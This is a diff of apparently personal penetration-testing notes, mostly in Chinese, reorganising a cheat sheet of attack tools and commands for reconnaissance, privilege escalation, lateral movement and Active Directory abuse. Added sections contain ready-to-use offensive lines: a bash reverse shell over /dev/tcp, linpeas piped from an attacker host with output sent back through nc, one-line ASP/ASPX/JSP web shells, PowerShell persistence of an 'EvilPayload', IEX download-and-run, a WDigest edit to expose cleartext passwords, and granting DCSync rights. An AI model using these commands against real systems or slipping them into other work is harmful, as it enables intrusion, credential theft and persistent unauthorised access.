@@ -1,6 +1,70 @@
+# Tool_CLI
+
 [TOC]
 
-# Tools(Metasploit，CobaltStrike)
+## Tool
+
+
+
+
+
+Reconnaissance
+
+google,ping,nslookup,dig,whois,subfinder,amass,gobuster,wfuzz,meltego
+
+
+
+Foothold
+
+nmap,dirb,御剑,jsfinder,linkfinder,whatweb,sqlmap,ehole,imb-aascan,awvs,nexpose,openvas,北极熊,nikto,sn1per,nessus,ldb,wafw00f,curl,webdev,testdev,spscan,fuff,feroxbuster,dirsearch,curl,wget,git,impacket,nxc,smbclient,smbmap,rpcclient,enum4linux-ng,rdesktop,swaks,sqlmap,sqsh,hydra,aircrack-ng,arpspoof,ettercap,bettercap,burpsuite,yakit
+
+
+
+Enumeration
+
+peass,metasploit,powerview-python,bloodhound,bloodhound-python,nxc
+
+
+
+Privilege_Escalation
+
+peass,powerup,metasploit,*potato.exe,RunAs,impacket,searchsploit,hydra
+
+
+
+Lateral_Movement
+
+ntpdate,powerview-python,impacket,nxc,enum4linux-ng,rpcclient,metasploit,kerbrute,evil-winrm,mimikatz,hashcat,john,rubeus,responder,krbrelay
+
+
+
+proxifier,proxychains,portfwd,autoroute,chisel,earthworm,ssh,iox,frp,neo-regeorg,pingtunnel,6tunnel
+
+
+
+certutil,bitsadmin,vbs,wget,curl,nc,scp,metasploit,invoke-webrequest,python,php,ruby,jweserver,miniserve,npx,impacket,nc,gzip,bzip2,xz,tar,zip,rar,7z,makecab&cabextract,compress-archive&expand-archive,runasCs,rlwrap,findstr,find,grep
+
+
+
+Persistence
+
+impacket,mimikatz,certipy-ad,powerview
+
+
+
+Covering_Tracks
+
+metasploit,mimikatz
+
+
+
+Credential_Binary
+
+hydra,impacket,john,hashcat,metasploit,cupp,cewl,crunch,hash-identifier,hashid,nth,openssl,mkpasswd,ssh-keygen
+
+ollydbg,x64dbg,windbg,immunitydebugger,cheatengine,ida
+
+#### Metasploit,CobaltStrike
 
 Metasploit
 
@@ -58,225 +122,121 @@ listen : http_port 10000
 
 beacon> spawn CobaltStrike_Metasploit #运行spawn增加转移会话
 
-------
+#### peass
 
-smb
+###### 目标不出网，文件不落地(peass)
 
-impacket-smbclient
+```
+kali : nc -lvnp 81 | tee linpeas_result.txt
 
-impacket-smbserver
+python3 -m http.server 80
 
-smbclient
+target : curl -L kali_link/linpeas.sh | sh | nc kali_link 81
 
-smbmap
+less -r linpeas.txt #格式化显示
+```
 
-crackmapexec
+###### 目标无curl，无nc，不出网，文件不落地(peass)
 
-enum4linux
+```
+kali : nc -lvnp 443 < linpeas.sh
 
-WiFi
+kali : nc -lvnp 445
 
-aircrack-ng
+target : cat < /dev/tcp/192.168.12.130/443 | sh > /dev/tcp/192.168.12.130/445
+```
 
-DNS
 
-dnsenum
 
-dig
 
-dnsnmap
 
-漏洞利用
+#### 后门
 
-searchsploit
+###### cymothoa后门(被meterpreter代替)(进程注入)
 
-nessus
+###### wmi
 
-ldap
+Import-Module .\Persistence\Persistence.psm1
 
-ldapsearch
+$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
 
-winrm
+$UserOptions = New-UserPersistenceOption -Registry -AtLogon
 
-evil-winrm
+Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
 
-bash
+<br>
 
-awk sed uniq tr cut grep rev
+#### dns隧道
 
-pwsh and cmd
+###### idoine dns隧道
 
-wmic pwsh
+#### bloodyAD
 
-mssql
+```
+bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 #连接
 
-mssqlclient
+bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 add genericAll "CN=win2019,CN=Users,DC=two,DC=com" "CN=kk,CN=Users,DC=two,DC=com" #添加genericAll权限，实现kk对win2019的fullcontrol
+```
 
-嗅探
+#### ldapsearch
 
-responder
+```
+ldapsearch -x -H ldap://192.168.12.5 -b "cn=users,dc=two,dc=com" "name=krbtgt" #匿名查询
 
-靠山吃山
+ldapsearch -x -H ldap://192.168.12.5 -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=krbtgt" #登录查询
 
-gtfobins and lolbas
+ldapsearch -H "ldap://192.168.12.5" -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=*" dn #查询users组下的成员，并返回每个成员的dn
+```
 
-ids/ips
+#### nxc bloodhound
 
-lbd
 
-wafw00f
 
-web
+peass #github.com/peass-ng/PEASS-ng
 
-curl
+metasploit 
 
-sqlmap
+post/windows/gather/enum_applications #应用程序
 
-dirb gobuster feroxbuster dirsearch 御剑
+post/windows/gather/enum_shares #共享
 
-蚁剑
+post/windows/gather/enum_unattend #无人值守文件
 
-bp
 
-git-dumper
 
-ftp
+linenum
 
-tftp
+linux-smart-enumeration
 
-wmi
+linux-exploit-suggester
 
-dcom
+linuxprivchecker.py
 
-winrm
+unix-privesc-check
 
-snmp
 
-snmp-check
-
-8080
-
-ssh
-
-scp
-
-ssl
-
-ssldump
-
-sslscan
-
-smtp
-
-smtp-user-enum
-
-侦察和打点
-
-fscan
-
-arp-scan
-
-nmap
-
-nikto
-
-whatweb
-
-wpscan
-
-wfuzz
-
-portscan
-
-sweep
-
-fping
-
-穿透
-
-ew
-
-proxychains
-
-nc
-
-pingtunnel
-
-6tunnel
-
-提权
-
-枚举
-
-peass
-
-横向
-
-mimikatz
-
-bloodhound
-
-procdump
-
-后门
-
-密码(哈希)
-
-hash-identifier
-
-nth
-
-keepass2John
-
-hydra
-
-openssl
-
-john
-
-hashcat
-
-cupp
-
-cewl
-
-crunch
-
-框架
-
-metsploit
-
-empire
-
-cs
-
-impacket
-
-powersploit
-
-nishang
-
-二进制
-
-xxd file strings
-
-渗透测试的实质以及最终目标是信息搜集和提升权限
 
 ------
 
-bloodhound
-
-![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1280.jpg)
 
 
+#### 后门
 
-bloodhound扫描器
+```
+bash : /bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/80 0>&1"
 
-bloodhound-python -c ALL -u administrator -p root@2016 -d one.com -dc DC.one.com -ns 192.168.10.5 --zip
+php : 
+
+asp : <%execute(request("cmd"))%>
+
+aspx : <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+
+jsp : <% Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));%> (无回显)
+```
 
 ------
 
-fscan
+#### fscan
 
 fscan.exe -h 192.168.1.1/24 (默认使用全部模块)
 
@@ -286,7 +246,7 @@ Auto_Wordlists
 
 ------
 
-powershell
+#### powershell
 
 powershell -ep bypass ". .\powerview.ps1;get-domainuser"
 
@@ -300,7 +260,7 @@ powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http:
 
 ------
 
-mimikatz (Procdump)
+#### mimikatz (Procdump)
 
 token::elevate #提升至system权限
 
@@ -596,7 +556,7 @@ misc::taskmgr
 
 ------
 
-修改注册表，以求明文
+#### 修改注册表，以求明文
 
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 
@@ -668,7 +628,7 @@ invoke-powershelludp -bind -Port 3333
 
 nc -nvu 192.168.10.1 3333
 
-删除补丁
+#### 删除补丁
 
 remove-update 
 
@@ -736,21 +696,85 @@ set URL http://192.168.0.105:8080/
 
 
 
+Add-DomainComputer/Add-ADComputer -ComputerName machine2 -ComputerPass 1qaz@WSX #添加AD域机器账户
 
-
-# 命令行
-
-
-
-
-
-[TOC]
+Remove-DomainComputer/Remove-ADComputer -ComputerName machine2 #移除AD域机器账户
 
 
 
+Get-DomainUser #查看AD域内所有账户或特定用户
+
+Get-LocalUser
+
+Add-DomainUser/Add-ADUser -UserName qq -UserPass 1qaz@WSX #添加AD域账户
+
+Remove-DomainUser/Remove-ADUser -Identity "qq" #移除AD域账户
 
 
-## windows 命令行操作(bat+powershell)
+
+Get-DomainGroupMember [-Identity] #查看AD域组内用户
+
+Add-DomainGroupMember/Add-GroupMember -Identity "administrators" -Members "qq" #添加AD域用户到组
+
+Remove-DomainGroupMember/Remove-GroupMember -Identity "administrators" -Members "qq" #移除组中AD域用户
+
+
+
+Get-DomainGroup [-Identity "administrators"] #获得全部/某个组信息
+
+Get-DomainGroup -MemberIdentity "win2019" 查询用户所属组信息
+
+Add-DomainGroup -Identity "qq-group" #添加域组
+
+
+
+Get-DomainObject/Get-ADObject [-Identity] #查看AD域内域对象[-SearchBase "CN=Users,DC=two,DC=com"] 查询users容器中的对象
+
+Set-DomainObject/Set-ADObject #添加AD域内域对象
+
+Remove-DomainObject/Remove-ADObject #移除AD域内域对象
+
+
+
+Get-DomainObjectOwner/Get-ObjectOwner #查询指定AD对象所有者信息
+
+Set-DomainObjectOwner/Set-ObjectOwner #查询指定AD对象所有者信息
+
+
+
+Add-DomainObjectAcl/Add-ObjectAcl #添加指定AD对象的ACL
+
+Remove-DomainObjectAcl/Remove-ObjectAcl #移除指定AD对象的ACL
+
+
+
+Get-DomainObjectAcl/Get-ObjectAcl
+
+Get-DomainUser -Identity "win2019" #查询win2019对象的objectSid
+
+Get-DomainObjectAcl -SecurityIdentifier "S-1-5-21-873118422-227618334-1429070027-1000"#查看win2019账户的权限（如果什么都没有就是没有权限）
+
+Get-DomainObjectAcl -Identity "CN=win2019,CN=Users,DC=two,DC=com"#查看其他安全主体对win2019账户的权限
+
+\#SecurityIdentifier 对 ObjectDN 所拥有的权限（ActiveDirectoryRights,AccessMask,ObjectAceType）
+
+\#[-Select "SecurityIdentifier,ObjectDN,ActiveDirectoryRights,AccessMask,ObjectAceType" -TableView] 选择显示选项以及是否按照表格形式排列
+
+
+
+Add-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #添加win2019对tow.com All 权限的acl
+
+Remove-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #删除win2019对tow.com All 权限的acl
+
+
+
+
+
+
+
+## CLI
+
+#### windows 命令行操作(bat+powershell)
 
 [F3]/[ctrl]+[F] 快速调出搜索栏
 
@@ -1184,7 +1208,7 @@ powershell -ep bypass ". .\PowerView.ps1 ; get-domainuser "
 
 
 
-## linux 命令行操作(bash)
+#### linux 命令行操作(bash)
 
 建立shell
 
@@ -2326,7 +2350,7 @@ skill
 
 su -l Qsa3 -c "whoami" #以Qsa3权限执行一条命令whoami，并返回原shell环境
 
-正则表达式
+#### 正则表达式
 
 ifconfig | grep -E '(\d+\.){3}\d' 匹配777.777.777.777
 
@@ -2418,4 +2442,4 @@ $ 匹配行尾 在[]之外使用 [a-z]$    匹配以a-z结尾的字符
 
 正向后行断言 (?<=pattern) 正后顾 向左（向后） 存在 pattern 我要找的位置，它的左边必须是... 
 
-负向后行断言 (?
+负向后行断言 (?<!pattern)
